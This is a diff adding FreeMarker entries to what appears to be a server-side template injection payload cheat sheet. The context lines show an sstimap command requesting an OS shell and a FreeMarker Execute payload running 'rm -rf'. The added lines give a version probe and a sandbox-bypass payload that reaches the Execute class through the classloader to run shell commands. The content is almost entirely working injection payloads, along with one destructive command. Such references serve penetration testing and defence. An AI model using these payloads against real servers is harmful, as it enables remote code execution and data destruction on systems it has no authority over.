@@ -33,6 +33,19 @@ python3 sstimap.py -u http://172.17.0.2/index.php?name=test --os-shell
 <#assign rt = "freemarker.template.utility.Execute"?new()>
 ${rt("rm -rf /something")}
 ```
+Detect version:
+```
+${.version}
+```
+Sandbox bypass (works <= v2.39):
+```
+<#assign classloader=article.class.protectionDomain.classLoader>
+<#assign owc=classloader.loadClass("freemarker.template.ObjectWrapper")>
+<#assign dwf=owc.getField("DEFAULT_WRAPPER").get(null)>
+<#assign ec=classloader.loadClass("freemarker.template.utility.Execute")>
+${dwf.newInstance(ec,null)("id")}
+```
+Do not forget to replace `article` with available entity.
 
 #### Mako #python 
 ```mako
